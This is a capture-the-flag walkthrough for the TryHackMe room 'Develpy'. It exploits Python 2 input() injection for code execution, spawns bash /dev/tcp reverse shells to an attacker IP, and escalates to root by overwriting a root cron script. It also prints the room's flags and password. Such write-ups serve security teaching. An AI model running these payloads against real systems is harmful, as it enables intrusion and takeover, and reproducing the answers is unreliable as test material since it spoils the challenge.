# Develpy CTF Walkthrough - TryHackMe

## 1. Challenge Overview
**Name:** Develpy
**Platform:** TryHackMe
**Category:** Scripting / PrivEsc
**Difficulty:** Medium

## 2. Reconnaissance

### Nmap Scan
We start with an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -p- -T4 10.49.163.225
```

**Output:**
```text
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Private 0days
|     Please enther number of exploits to send??:
```

## 3. Initial Access

### Python `input()` Vulnerability
Connecting to port 10000 reveals a Python service. The prompt asks for a number, but since it's likely using Python 2's `input()` function (which acts like `eval()`), we can inject Python code.

**Testing for RCE:**
```bash
echo "__import__('os').system('id')" | nc 10.49.163.225 10000
```

**Output:**
```text
        Private 0days

 Please enther number of exploits to send??: uid=1000(king) gid=1000(king) groups=1000(king)
```

### Gaining a Reverse Shell
We use the vulnerability to spawn a reverse shell.

**Listener:**
```bash
nc -lvnp 4444
```

**Payload:**
```bash
echo "__import__('os').system('bash -c \"bash -i >& /dev/tcp/192.168.244.56/4444 0>&1\"')" | nc 10.49.163.225 10000
```

### User Flag
Once inside as `king`, we can read the user flag.

```bash
cat /home/king/user.txt
```

**Flag:** `cf85ff769cfaaa721758949bf870b019`

## 4. Enumeration & Privilege Escalation

### Piet Password
There is a file `credentials.png` in the home directory. This is a program written in the esoteric language **Piet**. Decoding it (or searching for its known solution in this room) reveals the password for user `king`.

**Password:** `c00ffe123!`

### Cron Job Analysis
Checking `/etc/crontab` reveals a root cron job running a script in our home directory.

```bash
cat /etc/crontab
```

**Output:**
```text
*  *    * * *   root    cd /home/king/ && bash root.sh
```

### Exploiting the Cron Job
The `root.sh` file is owned by root, but since it resides in `/home/king/` and we own the directory, we can delete and replace it.

**Replacement Payload:**
```bash
rm /home/king/root.sh
echo 'bash -i >& /dev/tcp/192.168.244.56/4446 0>&1' > /home/king/root.sh
chmod +x /home/king/root.sh
```

**Listener:**
```bash
nc -lvnp 4446
```

Wait 1 minute for the cron job to execute.

## 5. Root Access

### Root Flag
After the reverse shell connects, we are root.

```bash
whoami
cat /root/root.txt
```

**Output:**
```text
root
9c37646777a53910a347f387dce025ec
```

**Root Flag:** `9c37646777a53910a347f387dce025ec`
